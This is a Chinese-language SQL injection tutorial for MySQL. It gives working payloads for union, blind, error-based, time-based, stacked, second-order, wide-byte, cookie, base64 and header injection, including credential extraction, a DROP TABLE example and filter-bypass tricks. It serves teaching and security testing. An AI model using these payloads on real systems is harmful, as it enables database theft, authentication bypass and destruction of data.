# 原理
SQL注入漏洞的产生需要满足两个条件：

+ 参数用户可控：前端传给后端的参数是用户可以控制的
+ 参数带入数据库查询：传入的参数拼接到SQL语句中，且带入数据库查询

假设ID参数是由用户传入，可以通过经典的单引号测试判断ID参数是否存在SQL注入漏洞：

```sql
select * from users where id = 1'
```

由于不符合数据库语法规范，所以会报错，出现报错恰恰说明是存在SQL注入漏洞的，因为只有在用户输入直接参与了SQL构造，才会因为`'`未闭合而报错。

当然，除此之外，也可以用恒真测试（`id=1 OR 1=1`，如果页面显示多了本不该显示的记录，说明可能存在注入）、恒假测试（`id=1 AND 1=2`， 如果原本有数据显示，现在变成空白或无数据，说明可能存在注入）等等来进行初步判断。一切只为了进一步拼接SQL语句进行攻击，致使数据库信息泄露甚至进一步获取服务器权限等等。

# 前置知识
## 重要库表
在MySQL5.0之后（当前主流是<font style="color:rgb(0, 29, 53);">MySQL8.0系列</font>），MySQL默认在数据库中存放一个名为`information_schema`的数据库：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756379960523-4d60e27a-01cb-48f6-8d33-5849f6f9c328.png)

在这个库中，有三个表是比较重要的，分别是`SCHEMATA`、`TABLES`和`COLUMNS`。

`SCHEMATA`表记录的是用户创建的所有数据库的库名（这里除了`test`库是笔者创建，其余都是MySQL自带）：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756380253741-751b7c10-a66c-4eda-af14-bdb0cf1ea59c.png)

`TABLES`表记录的是用户创建的所有数据库的库名和表名：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756380214674-504c2a81-19c6-4f7d-a158-aa6b399187a7.png)

`COLUMNS`表记录的是用户创建的所有数据库的库名、表名和字段名：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756380340001-5f13598b-87dd-4346-92de-f81db2990840.png)

## LIMIT的用法
在 MySQL 里，`LIMIT`用来限制查询结果的返回条数。

+ 写法一：

```sql
LIMIT n
```

表示返回前`n`条记录（相当于从第0条开始，取`n`条）。

+ 写法二：

```sql
LIMIT m, n
```

表示跳过前`m`条记录，然后再返回`n`条。即`m`是偏移量（offset），`n`是返回的行数（count）。

## 重要函数
+ `database()`： 返回当前会话正在使用的数据库名，如果没有选择数据库，返回值是`NULL`

```sql
mysql> SELECT database();
+------------+
| database() |
+------------+
| mydb       |
+------------+
1 row in set (0.00 sec)
```

 表示当前连接默认使用的库是`mydb`。

P.S.，在MySQL里，可以在连接时或者连接后指定“默认使用哪个数据库”，如果在连接时写的是：

```sql
mysql -u root -p mydb
```

 那么登录后，默认数据库就是`mydb`，执行`SELECT database();`就会返回`mydb`。如果在连接时写的是：

```sql
mysql -u root -p
```

那么执行`SELECT database();`就会返回`NULL`。执行`USE mydb;`切换后再执行`SELECT database();`就会返回`mydb`。

+ `version()`： 返回当前MySQL服务器的版本信息， 通常是一个字符串，包含主版本号、子版本号等信息

```sql
mysql> SELECT version();
+-----------+
| version() |
+-----------+
| 8.0.43    |
+-----------+
1 row in set (0.01 sec)
```

 表示当前MySQL版本是`8.0.43`。

+ `user()`： 返回当前MySQL连接的用户名和主机，格式通常是`"username@hostname"`

```sql
mysql> SELECT user();
+----------------+
| user()         |
+----------------+
| root@localhost |
+----------------+
1 row in set (0.00 sec)
```

 表示当前连接用户是`root`，连接来源是`localhost`。

## 注释符
在MySQL中，常见注释符的表达方式由：

+ 单行注释

```sql
SELECT * FROM users WHERE id = 1 # 这里是注释
```

在URL中，可以用`%23`——URL编码后的`#`来代替：

```plain
http://site.com/item.php?id=1%23
```

+ 双横线注释

 在MySQL中，`--`后面必须至少有一个空格才能生效：

```sql
SELECT * FROM users WHERE id = 1 -- 这里是注释
```

在URL中，可以用`--%20`（推荐）、`--+`（在某些情况下`+`会在URL解码时被当作空格）、`-- -`（有些测试环境/浏览器会直接允许在URL里输入空格，它会自动转义成`%20`）等来代替：

```plain
http://site.com/item.php?id=1--%20
```

+ 多行注释

`/*` 与 `*/` 之间的内容都会被忽略，可以跨行：

```sql
SELECT * FROM users /* 这里是注释 */ WHERE id = 1;
```

在URL中，`/*`和`*/`之间的内容会被忽略，甚至可以用它代替空格：

```plain
http://site.com/item.php?id=1/*这是注释*/
http://site.com/item.php?id=1/**/OR/**/1=1
```

## 内联注释
内联注释（`/*! ... */`）是MySQL很有特色的一种语法，`/*!`和`*/`中间的部分在MySQL中会被执行，而在其它数据库中会被当作注释忽略。

用法场景如下：

1. 写兼容代码

如果希望在MySQL中执行优化，但在别的数据库里忽略：  

```sql
SELECT /*! STRAIGHT_JOIN */ u.id, o.id
FROM users u, orders o
WHERE u.id=o.user_id;
```

    - 在 MySQL：执行`STRAIGHT_JOIN`强制优化器使用直连。
    - 在其他数据库：当作注释忽略，相当于普通的`SELECT u.id, o.id...`。
2.  带版本号

带版本号的内联注释， 意思是只有在数据库版本≥指定版本时才执行：  

```sql
SELECT /*!40101 SQL_NO_CACHE */ name FROM users;
```

    - `40101`表示MySQL 4.1.1及以上版本才会执行`SQL_NO_CACHE`。
    - 在低版本或者非MySQL 中，这部分会被忽略。

在URL中，如果访问`?id=1/*!UNION*/SELECT ...`， MySQL会解析为`id = 1 UNION SELECT ...`，在其它数据库（如SQL Server、Oracle），会被当作注释。在URL里`!`、空格等字符一般无需特殊转义，为了防止 防火墙 (WAF)/安全网关对`/*! ... */`特征拦截，或者个别Web框架或代理可能对`*`做二次处理，可以将`*`转义成`%2a`。

# 基础攻击
## Union注入攻击
### 原理
联合查询 (`UNION`) 是SQL里的合法语法，可以把两条`SELECT`语句的结果合并成一个结果集。

**关键条件**：两条`SELECT`的**列数**和**数据类型**必须一致，否则数据库会报错。  

正常语句如下：

```sql
SELECT id, name FROM users WHERE id = 1;
```

注入后的语句如下：  

```sql
SELECT id, name FROM users WHERE id = 1
UNION SELECT username, password FROM admin;
```

 这样，返回结果里就混入了管理员的账号和密码。

### 攻击步骤
1. 判断是否可注入

先在参数后拼接简单的测试：

```sql
id=1'
```

 如果与`id=1`返回的结果不同，出现SQL报错，说明可能存在注入点。

2. 确定列数

使用逐步增加`ORDER BY`数字或逐步增加`NULL`的数量来探测列数：

```sql
id=1 ORDER BY 3
```

如果查询成功，说明至少有3列；如果报错，说明小于3列。

或者直接用：

```sql
id=1 UNION SELECT NULL,NULL,NULL
```

直到返回正常页面，说明列数匹配。  

3. 确认可显示位置

用固定值代替，判断哪些列会被显示到页面：

```sql
id=1 UNION SELECT 1,2,3
```

如果页面正常执行，但没有返回`UNION SELECT`的结果，这是因为代码只返回第一条结果，所以`UNION SELECT`获取的结果没有输出到页面。可以通过设置参数`id`的值，让服务端返回`UNION SELECT`的结果。例如，把`id`的值设置为`-1`，这样数据库没有`id=-1`的数据，就会返回`UNION SELECT`的结果。

页面如果显示了`2`或`3`，就说明对应列的数据会被回显，可以用来显示敏感信息。  

4. 读取数据库信息

假如第2、3列的数据会被回显，不妨尝试在第2列的位置读取数据库信息：

获取当前数据库名：

```sql
id=1 UNION SELECT 1,database(),3
```

获取当前用户：

```sql
id=1 UNION SELECT 1,user(),3
```

获取版本信息：

```sql
id=1 UNION SELECT 1,version(),3
```

5. 获取表和字段

假如获取到当前数据库名是`mydb`，接着获取表名和字段名：

```sql
id=1 UNION SELECT 1,(SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA='mydb' LIMIT 0,1),3
```

如果页面只显示一条数据，可能只展示其中一部分（第一条或最后一条），所以为了保证页面能稳定显示，用`LIMIT`做逐条枚举（`LIMIT 0,1`取第1条，`LIMIT 1,1`取第2条，以此类推）。

假如刚刚获取到一个表名为`emails`，获取这个表的字段名：

```sql
id=1 UNION SELECT 1,(SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='mydb' AND TABLE_NAME='emails' LIMIT 0,1),3
```

依然是用`LIMIT`做逐条枚举。

6. 获取敏感数据

当获取了库名、表名和字段名时，就可以构造SQL语句查询数据库的数据。假如刚刚获取到`emails`表的一个字段名为`email_id`，则可以构造SQL语句如下：

```sql
id=1 UNION SELECT 1,(SELECT email_id FROM mydb.emails LIMIT 0,1),3
```

## Boolean注入攻击
### 原理
当应用程序不会直接把数据库查询结果返回给用户，而是只根据查询结果显示有数据/无数据两种状态时，就需要通过构造真假条件来逐步推断数据库中的信息。  

+ 构造`条件为真`：页面正常显示
+ 构造`条件为假`：页面显示为空或不同状态

通过对比页面的差异，逐步猜解出数据库中的信息。

### 攻击步骤
1. 判断是否存在布尔盲注

正常请求：

```sql
id=1
```

页面显示用户信息。

构造恒真条件：

```sql
id=1 AND 1=1
```

页面显示与正常相同。

构造恒假条件：

```sql
id=1 AND 1=2
```

页面显示为空或不同结果。

说明参数`id`可能存在Boolean注入。

2. 猜解当前数据库库名的长度

```sql
id=1 AND LENGTH(database())>=5
```

    - 如果页面正常：数据库名长度大于等于5，如果尝试6页面异常，则数据库库名长度等于5。
    - 如果页面异常：说明小于5。
3. 逐字符猜解数据库名

数据库库名的范围一般在a~z、0~9之内，可能还有一些特殊字符，这里的字母不区分大小写。

```sql
id=1 AND SUBSTR(database(),1,1)='m'
```

`SUBSTR`是截取字符串的函数，`SUBSTR(database(),1,1)`意味着截取`database()`的值，从第1个字符开始，每次只返回1个。

表名、字段名的猜解方法和数据库名一致，并且都可以利用Burp进行爆破。当获取了库名、表名和字段名时，就可以构造SQL语句查询数据库的数据。

## 报错注入攻击
### 原理
报错注入（Error-based SQLi）是利用数据库在执行特殊函数或非法操作时返回的错误信息，从错误内容里直接获取数据库信息的一种注入方式。MySQL 在执行某些函数（如`updatexml()`、`extractvalue()`、`floor()` 等）时，如果参数不合法，会将错误信息原封不动地返回给应用层。攻击者就可以把想要的数据嵌入到这些函数的参数中，从而让数据库“主动”在报错信息里泄露出来。

### 攻击步骤
1. 判断是否存在报错注入

在注入点尝试触发数据库错误，例如：

```sql
id=1'
```

在数据库执行SQL时，会因为多了一个单引号而报错，输出到页面的结果类似于：

```sql
java.sql.SQLSyntaxErrorException: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1
```

这说明程序直接将错误信息输出到了页面上，所以存在报错注入。

2. 利用报错函数输出数据

常见的可用于报错注入的函数有：

    - `updatexml()`

`updatexml(XML_document, XPath_string, new_value)`作用是对XML/XPath做更新，当`XPath_string`不是合法`XPath`时，MySQL会抛出错误，并把出错的字符串内容返回。  

```sql
id=1' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--%20
```

`<font style="background-color:rgb(248, 248, 248);">~</font>`<font style="color:rgb(37, 43, 58);">符号（ASCII编码值是</font>`<font style="color:rgb(37, 43, 58);">0x7e</font>`<font style="color:rgb(37, 43, 58);">）是不存在XPath格式中的，所以使用了会报XPath语法错误。</font>`(SELECT user())`会返回当前数据库用户，例如：`root@localhost`。最后页面返回结果类似于：

```sql
java.sql.SQLException: XPATH syntax error: '~root@localhost'
```

    - `extractvalue()`

`extractvalue(xml_frag, xpath_expr)`作用是<font style="color:rgb(37, 43, 58);">从一个使用XPath语法的XML字符串中提取一个值，当</font>`<font style="color:rgb(37, 43, 58);">xpath_expr</font>`<font style="color:rgb(37, 43, 58);">不符合XPath格式，就会报错。</font>

```sql
id=1' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))--%20
```

    -  基于`floor(rand())`+`group by`的“重复键”报错  

`rand(0)`在同一查询里可重复，拼接字符串后`group by`可能制造重复键，触发“Duplicate entry '…' for key …”的错误，重复键内容里会“带出”拼进去的函数结果：

```sql
id=1' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT user()),floor(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)--%20
```

通过利用不同的报错函数，获取库名、表名和字段名，之后就可以构造SQL语句查询数据库的数据。

# 进阶攻击
## 时间注入攻击
### 原理
当页面不回显数据，也不显示错误时，攻击者依然可以通过让数据库故意延迟响应来判断条件的真假。

+ 如果条件为真：执行延时函数（页面变慢）。
+ 如果条件为假：不延时（页面迅速返回）。

通过对比响应时间的差异，可以逐步推断出数据库中的信息。

### 攻击步骤
1. 验证是否可延时

```sql
id=1' AND SLEEP(5)--%20
```

 如果页面延迟大约5秒才返回，说明可以利用时间通道。

2. 逐步获取信息

时间注入多与`IF(expr1,expr2,expr3)`结合使用，此`if`语句含义是：如果`expr1`是`TRUE`，则返回`expr2`，否则返回`expr3`。

判断数据库库名长度：

```sql
id=1' AND IF(LENGTH(database())=4,sleep(5),1)--%20
```

如果延时，那么长度是4；否则执行`id=1' AND 1`，`AND 1`等价于不加任何限制，语句仍然成立，立即返回结果。  

判断数据库库名第一个字符：

```sql
id=1' AND IF(SUBSTRING(database(),1,1)='m',sleep(5),1)--%20
```

 通过循环这种方式，就能拼出完整的数据库信息。

不难发现，时间注入的核心在于“用响应时间差替代页面回显”，哪怕没有报错信息，也能逐位猜出数据库里的数据。

## 堆叠查询注入攻击
### 原理
堆叠查询注入指的是：在一个SQL语句末尾，通过分号`;`再拼接上另一条独立的SQL语句，从而实现多条语句的执行。例如：

```sql
SELECT * FROM users WHERE id=1; DROP TABLE users;
```

 这种注入比`UNION`注入危害更大，因为攻击者可以执行任意写操作，甚至直接对数据库结构进行破坏。  

但是，并不是所有环境都支持堆叠查询：

+ **支持**：原生执行SQL的API（如`JDBC Statement.execute()`、`sqlite3_exec()`）。
+ **不支持**：使用`PreparedStatement`、`mysql_query()`这类一次只能执行一条语句的API。

### 攻击步骤
1.  判断是否支持多语句
+ 在参数里尝试拼接一个无害的第二条语句：

```sql
id=1'; SELECT 1--%20
```

    - 如果数据库报错“You have an error near …”，说明语句拼接被截断，可能不支持堆叠。
    - 如果能正常执行第二条查询（例如返回结果或日志出现`1`），说明支持堆叠。
2. 读写信息

获取当前数据库名：

```sql
id=1'; SELECT database()--%20
```

获取表名：

```sql
id=1'; SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA='mydb'--%20
```

获取字段名：

```sql
id=1'; SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='mydb' AND TABLE_NAME='emails'--%20
```

## 二次注入攻击
### 原理
一次注入：攻击者提交的恶意输入，立即拼接进SQL并执行。

二次注入：攻击者的恶意输入第一次被当作普通数据存入数据库，看似无害；但在第二次被取出再拼接到另一条SQL里执行时，才触发注入。

特点：

+ 第一次插入：数据库里存的是“有陷阱的数据”
+ 第二次使用：开发者误以为数据“安全”，直接拼接执行，引发注入

### 攻击步骤
1. 找到可存储点

在注册、修改资料、留言等功能里，提交特制的输入，例如注册用户名：

```sql
username=admin' --%20
```

这时用户数据会被存入数据库表里，看似只是个普通字符串。  

2. 等待“二次利用”

当系统管理员或后台功能，在别的地方使用这个数据时（比如拼接成查询语句），注入被触发。例如后台登录验证SQL：

```sql
SELECT * FROM users WHERE username='<数据库里的用户名>' AND password='...';
```

如果数据库里存的用户名是`admin' --`，拼接后变成：  

```sql
SELECT * FROM users WHERE username='admin' --%20' AND password='...';
```

密码部分被注释掉，直接绕过验证。

二次注入的本质是“恶意数据先存储，再被误当作代码执行”。它往往绕过了开发者“只在用户输入处过滤”的防线，更隐蔽也更危险。

## 宽字节注入攻击
### 原理
宽字节是相对于ASCII这样单字节而言的，像GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。

宽字节注入主要出现在MySQL+PHP的组合里，当数据库连接编码设置为GBK、BIG5等双字节编码时。

在宽字节编码里，一个中文字符由两个字节组成。如果输入的第一个字节是`%bf`、`%df`等特殊值（ASCII码大于128，才到汉字的范围），后面紧接着输入单引号时，MySQL会调用转义函数，将单引号变为`\'`，其中`\`的十六进制是`%5c`，宽字节编码会认为`%df%5c`是一个宽字节，也就是`<font style="color:rgb(85, 85, 85);">運</font>`<font style="color:rgb(85, 85, 85);">。</font>原本的单引号`'`失效了，后面的内容会被继续解析为SQL语句，从而绕过转义。

### 攻击步骤
1. 确认字符集

检查数据库连接使用的编码，例如： 

```sql
SHOW VARIABLES LIKE 'character_set%';
```

如果`character_set_client`/`character_set_connection`是GBK、BIG5，就存在宽字节注入的可能。

2. 构造输入绕过转义

```sql
id=1 %df'--+
```

此时执行的SQL语句是：

```sql
SELECT * FROM users WHERE id='1 運' -- '
```

拼接的`'`可以逃逸出来，使`id='1'`闭合，接下来就可以像普通注入一样拼接条件。

3. 继续注入

例如探测列数：

```sql
id=1 %df' ORDER BY 3 --+
```

本质上，宽字节注入就是“借助编码绕过转义”，从而把单引号重新释放出来。也正因如此，最好使用参数化查询，并且统一使用安全的字符集（如 UTF-8）。  

## cookie注入攻击
### 原理
<font style="color:rgb(23, 35, 63);">Cookie注入漏洞的原理与GET/POST注入类似，主要区别在于参数传递方式。在传统的GET/POST注入中，参数通过URL或表单传递，而在Cookie注入中，参数通过Cookie传递。如果服务器端在处理Cookie时没有进行严格的输入验证，攻击者可以通过构造恶意Cookie来注入SQL语句或其他恶意代码。</font>

### 攻击步骤
1.  定位Cookie注入点

 观察请求中的`Cookie:`头，找出可能参与业务查询的键，如`id=1`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756694002547-3920f473-0abb-486d-9e80-8952d039f711.png)

2. 修改Cookie值做异常探测

<font style="color:rgb(0, 0, 0);">修改Cookie中的</font>`<font style="color:rgb(0, 0, 0);">id=1</font>`<font style="color:rgb(0, 0, 0);">为</font>`<font style="color:rgb(0, 0, 0);">id=1'</font>`<font style="color:rgb(0, 0, 0);">，再次访问该URL，发现页面返回错误。说明Cookie值</font>被拼接<font style="color:rgb(0, 0, 0);">进了SQL。</font>

3. <font style="color:rgb(0, 0, 0);">继续注入</font>

<font style="color:rgb(0, 0, 0);">使用</font>`<font style="color:rgb(0, 0, 0);">ORDER BY</font>`<font style="color:rgb(0, 0, 0);">探测列数，使用Union注入的方式完成此次注入。</font>

## base64注入攻击
### 原理
一些开发者为了简单加密或防止用户篡改参数，会把参数用Base64编码再传输。例如：

+ URL 参数：`id=MQ==`（Base64解码后是`id=1`）
+ Cookie 值：`dXNlcj1hZG1pbg==`（解码后是`user=admin`）

服务端在接收时会先Base64解码，再拼接到SQL语句中。攻击者只要能控制原始输入，就能先写好注入Payload，再Base64编码后提交。

### 攻击步骤
1. 发现参数被Base64编码

特征是参数值只包含`A–Z`、`a–z`、`0–9`、`+`、`/`、`=`，符合Base64格式。 可以尝试把数值改掉再重新编码，看页面返回是否对应变化。

2. 验证是否可注入

构造简单测试Payload，例如解码后带`'`的字符串。<font style="color:rgb(0, 0, 0);">当访问</font>`<font style="color:rgb(0, 0, 0);">id=1'</font>`<font style="color:rgb(0, 0, 0);">编码后的网址时（</font>`<font style="color:rgb(0, 0, 0);">id=MSc%3d</font>`<font style="color:rgb(0, 0, 0);">），页面返回错误， 说明注入可能存在。</font>

3. 继续注入

<font style="color:rgb(0, 0, 0);">使用</font>`<font style="color:rgb(0, 0, 0);">ORDER BY</font>`<font style="color:rgb(0, 0, 0);">探测列数，使用Union注入的方式完成此次注入。</font>

## XFF注入攻击
### 原理
X-Forwarded-For (XFF) 是HTTP请求头，用来记录客户端的真实IP地址。一些应用会直接从XFF头中获取IP，并存入数据库（如登录日志、操作审计），或者在SQL查询中使用（如根据IP做访问控制）。如果开发者在拼接SQL时没有对XFF值进行参数化处理，那么攻击者就能篡改请求头，构造注入Payload，触发SQL注入漏洞。

### 攻击步骤
1. 检查请求头

打开浏览器开发者工具或代理工具（如 Burp Suite），查看是否有`X-Forwarded-For`头，如果没有，可以自己手动加上。

2. 构造简单测试值

 在XFF中加入特殊字符，例如：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756695219739-d8629e86-9ed7-4dad-82aa-6dc3db747df2.png)

如果页面报错或响应异常，说明XFF值可能被拼接到SQL中。

3. 继续注入

<font style="color:rgb(0, 0, 0);">使用</font>`<font style="color:rgb(0, 0, 0);">ORDER BY</font>`<font style="color:rgb(0, 0, 0);">探测列数，使用Union注入的方式完成此次注入。</font>

# 绕过技术
很多Web应用或WAF（Web Application Firewall）会对关键字或特殊符号做过滤。但如果开发者只做了简单的“字符串替换”或“不完全的正则过滤”，攻击者就可能通过一些技巧绕过检测。  

## 大小写绕过注入
SQL关键字在多数数据库中对大小写不敏感，如果系统只过滤了`union`，但没过滤`UNION`或`UnIoN`，就可以绕过。

+ 被拦截：

```sql
id=1 UNION SELECT username,password FROM users
```

+ 绕过写法：

```sql
id=1 UnIoN SeLeCt username,password FROM users
```

## 双写绕过注入
一些防护机制采用“删除关键字”的方式，如果攻击者故意双写，就可能绕过。例如WAF删除一次`UNION`后，结果仍然是`UNION`。    

+ 被过滤：`UNION`
+ 攻击者输入：`UNIUNIONON`
+ WAF 删除一次`UNION`：还剩下 `UNION`，能继续执行。

## 编码绕过注入
 数据库和Web服务器在不同阶段会对参数进行URL编码、Unicode编码或其他编码的解码处理。过滤器可能只检查原始输入，而数据库最终执行的是解码后的内容。

+ 普通写法：

```plain
id=1' OR '1'='1
```

+ URL 编码写法：

```plain
id=1%27%20OR%20%271%27%3D%271
```

如果防护只检查 `'`，但没识别 `%27`，就可能被绕过。

## 内联注释绕过注入
<font style="color:rgb(77, 77, 77);">内联注释就是把一些特有的仅在</font><font style="color:rgb(78, 161, 219) !important;">MySQL</font><font style="color:rgb(77, 77, 77);">上的语句放在</font>`<font style="background-color:rgb(249, 242, 244);">/*!...*/</font>`<font style="color:rgb(77, 77, 77);">中，这样这些语句如果在其它数据库中是不会被执行，但在</font><font style="color:rgb(78, 161, 219) !important;">MySQL</font><font style="color:rgb(77, 77, 77);">中会执行，可以</font><font style="color:rgb(77, 77, 77);">用于绕过一些边界检测的正则表达式：</font>

```plain
?id=' UNION /*!SELECT*/ 1,2,3 --%20
```

